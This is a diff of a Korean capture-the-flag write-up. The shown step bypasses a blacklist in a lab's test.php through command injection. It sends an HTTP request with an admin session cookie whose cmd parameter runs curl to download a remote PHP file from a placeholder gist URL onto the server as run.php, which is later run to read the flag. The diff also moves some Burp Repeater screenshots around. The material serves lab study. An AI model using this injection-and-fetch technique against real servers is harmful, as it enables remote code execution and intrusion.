@@ -135,21 +135,25 @@ curl -fsSL <GIST_RAW_URL> -o run.php
 
 `-fsSL`은 오류 처리·출력 억제·리다이렉트 추적 옵션이고, `-o run.php`는 받은 파일을 `run.php`로 저장한다. 명령의 `cmd`에는 `/flag` 문자열이 없으므로, `test.php`의 블랙리스트는 다운로드된 PHP 파일 내부까지 검사하지 못한다.
 
+
+`GIST_RAW_URL`은 본인이 생성한 파일의 Raw 주소이며, 실제 HTTP 요청에서는 URL 인코딩해서 넣는다.
+
+| Burp 탭에서 '+' 클릭 | new http 클릭 |
+| :---: | :---: |
+| <img src="https://github.com/user-attachments/assets/27d82cd4-118f-4a1f-80f3-ff04a31fc798" width="380" alt="Burp Repeater 명령 입력 화면 1" /> | <img src="https://github.com/user-attachments/assets/50b2183f-ce14-4ad3-b887-ab5c49e76e15" width="380" alt="Burp Repeater 명령 입력 화면 2" /> |
+
+
+<p align="center"><img src="https://github.com/user-attachments/assets/11be12dc-84ec-4f06-b74d-f56313a6ea43" width="630" alt="run.php 다운로드 명령 전송 화면" /></p>
+
+
 ```http
 GET /test.php?cmd=curl%20-fsSL%20<URL_인코딩한_GIST_RAW_URL>%20-o%20run.php HTTP/1.1
 Host: <VM_주소:포트>
 Cookie: PHPSESSID=<관리자_세션_ID>
 ```
 
-`GIST_RAW_URL`은 본인이 생성한 파일의 Raw 주소이며, 실제 HTTP 요청에서는 URL 인코딩해서 넣는다.
+입력후 send
 
-| Burp 설정 화면 ① | Burp 설정 화면 ② |
-| :---: | :---: |
-| <img src="https://github.com/user-attachments/assets/27d82cd4-118f-4a1f-80f3-ff04a31fc798" width="380" alt="Burp Repeater 명령 입력 화면 1" /> | <img src="https://github.com/user-attachments/assets/50b2183f-ce14-4ad3-b887-ab5c49e76e15" width="380" alt="Burp Repeater 명령 입력 화면 2" /> |
-
-<p align="center"><img src="https://github.com/user-attachments/assets/11be12dc-84ec-4f06-b74d-f56313a6ea43" width="630" alt="run.php 다운로드 명령 전송 화면" /></p>
-
-명령 결과가 비어 보일 수 있지만, 앞서 확인한 `$resulttt`와 `$result` 변수명 불일치 때문이다.
 
 ### 5. `run.php` 실행 후 FLAG 확인
 
